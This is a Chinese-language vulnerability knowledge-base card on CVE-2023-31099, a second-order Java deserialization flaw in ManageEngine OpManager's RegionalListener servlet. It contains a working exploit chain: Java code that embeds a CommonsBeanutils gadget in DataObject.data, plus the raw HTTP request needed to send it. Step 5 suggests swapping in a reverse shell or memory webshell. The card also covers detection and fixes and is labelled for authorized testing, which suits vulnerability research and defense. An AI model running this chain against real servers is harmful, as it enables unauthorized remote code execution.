---
id: web-java-deserialization-opmanager-dataobject-regional-listener-getobjectdata-rce
title: OpManager CVE-2023-31099：RegionalListener 白名单反序列化 DataObject，transferDataToNOC 在 notificationType=24 且 userProps 含 regReqID 时触发 getObjectData 二次反序列化 RCE
type: scenario
domain: web
path: web/java/deserialization
technique: opmanager-dataobject-nested-deserialization-whitelist-bypass
aliases:
- CVE-2023-31099
- Zoho ManageEngine OpManager RCE
- OpManager DataObject 反序列化
- RegionalListener 反序列化
- transferDataToNOC getObjectData
- ITOMObjectInputStream 白名单绕过
tags:
- java
- manageengine
- opmanager
- deserialization
- whitelist-bypass
- second-order-deserialization
- gadget
- rce
- cve-2023-31099
cve:
- CVE-2023-31099
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V618
  verified_at: '2026-11-12T21:06:59+08:00'
  notes: '已对照原文 content.md 与全部 4 张图逐项核对：图 01 修复 diff（new ObjectInputStream→ITOMObjectInputStream+setClassName 类白名单）、图 02 RegionalListener POST 分支仅白名单 DataObject 后 readObject 并调 transferDataToNOC、图 03 transferDataToNOC 中 notificationType==24 && dataPriority==0 且 userProps.getProperty(regReqID)!=null 时调用 dataObject.getObjectData()、图 04 Burp 向 8060 端口 /servlet/com.me.opmanager.extranet.remote.communication.fw.fe.RegionalListener 发送 1.ser（带 authkey/regionID/method: POST）成功在 Windows 落地 1.txt，均与卡片一致；PoC 的 CommonsBeanutilsNOCC、NmsUtil.compress、cmd /c echo 1 > c:\1.txt 与原文代码一致。CVE-2023-31099 见原文标题，cve 字段正确；affected_versions 原文未标注（仅给出归档下载页 opmanager/126323），保持不设。验证时把步骤/PoC 的 Content-Type 由 application/octet-stream 修正为复现抓包实际值 application/x-www-form-urlencoded（servlet 直接 getInputStream 读原始流，不影响解析）。dedup related=2（SerialKiller 业务代理白名单绕过、OpenAM jato clientSession 二次反序列化）为不同产品/入口，非同链；kb cve CVE-2023-31099 无记录，全库无同 CVE 卡；dup-scan 无涉及 pair。未验证点：未搭建 central+probe 环境复现，authkey/regionID 为环境相关占位。'
---

## 一句话结论

OpManager 的 `RegionalListener` servlet 用 `ITOMObjectInputStream` 只放行 `com.me.opmanager.extranet.remote.communication.fw.DataObject` 这一种外层类来反序列化 POST 请求体，但 `DataObject` 自带一个压缩的 `byte[] data` 字段，业务流 `SPPRegionalCommBE.transferDataToNOC` 在 `notificationType==24`、`dataPriority==0` 且 `userProps` 中存在 `regReqID` 键时会调用 `dataObject.getObjectData()`，对 `data` 解压后再次 `ObjectInputStream.readObject()`（这次没有白名单）；把 gadget 序列化后压缩塞进 `data`，外层用合法 `DataObject` 通过白名单，即可二次反序列化 RCE（CVE-2023-31099）。

## 原理

- **入口与白名单**：`web.xml` 将 `com.me.opmanager.extranet.remote.communication.fw.fe.RegionalListener` 映射为 `/servlet/...RegionalListener`，其 `POST` 分支用 `ITOMObjectInputStream` 读取请求体，并 `setClassName` 白名单只允许 `DataObject`。直接发 ysoserial 的 gadget 类会在第一层被拒绝——白名单只保护了这一层。
- **sink 在嵌套字段**：`DataObject#getObjectData()` 的逻辑是：未加密且 `object != null` 时直接返回；否则把 `data` 经 `NmsUtil.decompress` 解压后交给 `new ObjectInputStream(bais).readObject()`。也就是说 `data` 本身就是一段独立的 Java 序列化流，`DataObject` 只是承载它的合法外壳。
- **二次反序列化**：攻击者把任意 gadget 的序列化字节压缩后放入 `DataObject.data`（`isDataEncrypted=false` 走 decompress 分支）；`DataObject` 自身能被白名单接受，真正的恶意字节要等业务代码调用 `getObjectData()` 时才被反序列化，而该调用点没有类白名单。
- **触发路径**：`RegionalListener` 读入 `DataObject` 后调用 `SPPRegionalCommBE.getInterface().transferDataToNOC(dataObject, regionID)`；其中当 `getNotificationType()==24 && getDataPriority()==0` 时取 `userProps`，若 `userProps.getProperty("regReqID") != null`，执行 `MSPRequestDispatcher.addResponseMap(userProps, (String)dataObject.getObjectData())`，从而触发嵌套反序列化。
- **修复**：官方 diff 把该处的 `new ObjectInputStream(bais)` 换成 `ITOMObjectInputStream`，并对其设置类白名单（`setClassName`），让内层流也受约束。
- **认证面**：该 servlet 不需要 OpManager Central 的 Cookie，但要求三个头：`authkey`（安装 probe 时使用的 key，central/probe 共享密钥）、`regionID`（probe 名称）、`method: POST`；即持有部署侧共享密钥或能获取到它的人可打穿。

## 触发条件

- 目标 OpManager 部署中存在 central/probe 通信，`/servlet/com.me.opmanager.extranet.remote.communication.fw.fe.RegionalListener` 可达（常见于 8060 等管理端口）。
- 已知或可获取 probe 安装时的 `authkey` 与 `regionID`（测试环境自建 central+probe 时可直接指定）。
- 目标 classpath 有可用 gadget 依赖（示例用 CommonsBeanutils 系 payload，实际以目标依赖为准）。
- 能向该 servlet 发送原始二进制 POST（Burp 改请求体或脚本直连）。

## 利用步骤

1. 确认入口：访问 `/servlet/com.me.opmanager.extranet.remote.communication.fw.fe.RegionalListener`，按 web.xml 路由确认版本存在；准备 `authkey`、`regionID`。
2. 选择与目标依赖匹配的 gadget（示例 `CommonsBeanutilsNOCC`），生成命令执行载荷的序列化字节。
3. 构造 `DataObject`：反射设置 `notificationType=24`、`dataPriority=0`、`userProps` 为含 `regReqID` 键的 `Properties`、`data=NmsUtil.compress(gadgetBytes)`（`isDataEncrypted` 保持 false）。
4. 把 `DataObject` 序列化为 `1.ser`，作为 body POST 到上述 servlet，携带 `authkey`、`regionID`、`method: POST` 三个头，`Content-Type: application/x-www-form-urlencoded`（复现抓包实际值；servlet 直接 `getInputStream()` 读原始流，Content-Type 不影响解析）。
5. 观察命令副作用（示例命令写文件）；链路通后可替换为反弹 shell、内存马等载荷，并注意目标 JVM 版本与依赖对 gadget 的限制。

## PoC

构造并序列化 DataObject（示例命令为写文件，字段通过反射设置）：

```java
DataObject obj = new DataObject();
setField(obj, "notificationType", 24);
setField(obj, "dataPriority", 0);
Properties userProps = new Properties();
userProps.put("regReqID", "qwe");
setField(obj, "userProps", userProps);

Class<? extends ObjectPayload> payloadClass =
        ObjectPayload.Utils.getPayloadClass("CommonsBeanutilsNOCC");
ObjectPayload payload = (ObjectPayload) payloadClass.newInstance();
Object object = payload.getObject("cmd /c echo 1 > c:\\1.txt");

ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(object);
oos.flush();
byte[] datas = NmsUtil.compress(baos.toByteArray());
setField(obj, "data", datas);
obj.getObjectData();   // 本地可先验证嵌套流能触发

FileOutputStream fos = new FileOutputStream("1.ser");
ObjectOutputStream foos = new ObjectOutputStream(fos);
foos.writeObject(obj); // 发送这串字节
```

发送请求：

```http
POST /servlet/com.me.opmanager.extranet.remote.communication.fw.fe.RegionalListener HTTP/1.1
Host: target:8060
authkey: <安装 probe 时的 key>
regionID: <probe 名称>
method: POST
Content-Type: application/x-www-form-urlencoded
Content-Length: <1.ser 长度>

<1.ser 原始字节>
```

说明：`setField` 为反射设字段的辅助方法；`authkey`/`regionID` 需替换为目标环境真实值。PoC 仅为文章链路的结构化复现，未在本机执行，仅用于授权测试。

## 变体与关联

- **gadget 变体**：内层流可换任意与目标 classpath 匹配的链（CommonsBeanutils、CommonsCollections、CB 等）；`DataObject` 只负责承载，不限制内层类型。
- **触发字段变体**：`notificationType=24` 与 `dataPriority=0` 是进入分支的开关，`regReqID` 只校验键存在（值不影响），可填任意字符串。
- **加密分支**：`isDataEncrypted=true` 时 `data` 需先按 `EEFrameworkUtil.decryptDataObject` 的算法加密再压缩；本文演示用未加密压缩分支。
- **同类白名单绕过思路**：外层白名单 + 内层二次反序列化，可参考 [[web-java-component-yonyou-u8-servicedispatcher-invocationinfo-readexternal-cc6]]（InvocationInfo.readExternal 嵌套流）与 [[web-java-deserialization-jackson-signedobject-getobject-short-chain]]（SignedObject 二次反序列化）。
- **关联**：OpManager 管理端口上的其他漏洞需另查 CVE 库；本卡只覆盖该 servlet 链路。

## 检测与防御

- **修复**：升级到官方已用 `ITOMObjectInputStream` + 类白名单处理内层流的版本（diff 中同时约束了 `setClassName` 白名单）。
- **检测**：管理端口出现对 `/servlet/com.me.opmanager.extranet.remote.communication.fw.fe.RegionalListener` 的 POST 二进制请求；请求带 `authkey`/`regionID` 头但来源不是已知 probe；日志出现反序列化异常（如 `Error occurs while De-Serializing the data for module id`）；JVM 侧异常子进程/文件落地。
- **防御**：管理端口（如 8060/8061）只对受信 probe/central 网段开放；轮换并保管 probe `authkey`，避免泄露到前端或日志；对反序列化入口部署 RASP/白名单；监控异常序列化流量与命令执行副作用。
